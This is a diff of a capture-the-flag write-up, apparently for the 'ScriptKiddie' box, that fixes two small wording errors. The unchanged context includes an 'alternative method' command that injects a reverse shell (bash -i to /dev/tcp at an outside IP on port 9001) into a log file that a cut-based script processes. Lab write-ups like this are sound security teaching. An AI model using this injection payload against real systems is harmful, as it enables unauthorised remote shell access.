@@ -807,7 +807,7 @@ drwxr-xr-x 11 kid kid 4096 Feb  3 11:49 ..
 -rw-rw-r--  1 kid pwn    0 Jun 12 12:43 hackers
 ```
 
-There was a `logs` directory, with a `hackers` file owned by the `pwn`user, which was empty.
+There was a `logs` directory, with a `hackers` file owned by the `pwn` user, which was empty.
 
 I wondered if trying to 'hack' the site updated the file:
 
@@ -1161,7 +1161,7 @@ That's the box!
 
 ## Notes on Alternative Methods
 
-An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting three rows of arbitrary data before the command:
+An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting two rows of arbitrary data before the command:
 
 ```bash
 kid@scriptkiddie:~/logs$ echo 'whatever whatever ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.211/9001 0>&1"' >> hackers
